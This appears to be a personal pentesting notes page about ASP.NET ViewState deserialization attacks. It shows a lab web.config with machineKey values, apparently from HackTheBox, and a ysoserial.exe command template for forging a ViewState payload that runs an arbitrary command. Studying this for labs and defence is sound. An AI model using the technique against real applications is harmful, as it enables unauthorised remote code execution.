---
Primary_category: "[[DESERIALIZATION]]"
title: "VIEWSTATE CODE INJECTION"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY →  [[DESERIALIZATION]]

#### *Theory*

![[VIEWSTATE CODE INJECTION-20260110200147087.webp|350]]

> ***Zoom in***

---

#### *Abuse*

To abuse this attack vector, we must know both the *validation key* and *encryption key*, in case both are used

Similarly, the *IIS* and *ASP.NET* application do not have to be configured to generate these keys at runtime, otherwise the attack cannot be carried out

Both keys are usually stored on a *web.config* file, along with their encryption algorithms

All this data is used to *encrypt-then-sign (MAC)* the *ASP.NET* objects and parameters serialized on the server before send them to the client

So, the requirement is basically to have access to the *web.config* file content to use the given keys to craft a serialized payload containing malicious code by abusing certain *gadgets*

The latter can be accomplished using ***[YSoSerial.NET](https://github.com/pwntester/ysoserial.net)***

We can have access to the mentioned file by leveraging certain attack vectors such as a *File Disclosure* or a *[[LFI]]* or by having direct access to the system

It is worth noting that if the *web application* uses *preshared keys* to build the *VIEWSTATE* data and so on, they can be extracted using tools such as ***[Blacklist3r](https://github.com/NotSoSecure/Blacklist3r)***

Imagine we have the following *web.config* file

> [!BUG]- *web.config*
>
> ```bash
> <configuration>␍
>   <system.web>␍
>     <customErrors mode="On" defaultRedirect="default.aspx" />␍
>     <httpRuntime targetFramework="4.5" />␍
>     <machineKey decryption="AES" decryptionKey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" validation="SHA1" validationKey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" />␍
>   </system.web>␍
>     <system.webServer>␍
>         <httpErrors>␍
>             <remove statusCode="403" subStatusCode="-1" />␍
>             <error statusCode="403" prefixLanguageFilePath="" path="http://dev.pov.htb:8080/portfolio" responseMode="Redirect" />␍
>         </httpErrors>␍
>         <httpRedirect enabled="true" destination="http://dev.pov.htb/portfolio" exactDestination="false" childOnly="true" />␍
>     </system.webServer>␍
> </configuration>
> ```
>

Then, we can run the command below in order to craft a serialized payload contaning the any command

> ***[YSoSerial.NET](https://github.com/pwntester/ysoserial.net)***

> ***From a Windows machine***

```bash
.\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "<COMMAND>" --path="<PATH>" --apppath="<APP_PATH>" --decryptionalg="<ENCRYPTION_ALGORITHM>" --decryptionkey="<KEY>" --validationalg="<SIGNING_ALGORITHM>" --validationkey="<KEY>"
```

Similary, we can list examples for a certain *plugin*, such as *VIEWSTATE*, as follows

```bash
.\ysoserial.net\Release\ysoserial.exe --plugin ViewState --examples
```

---

#### *References*

***[Exploiting ViewState Deserialization using Blacklist3r and YSOSerial.NET](https://www.claranet.com/us/blog/2019-06-13-exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserialnet)***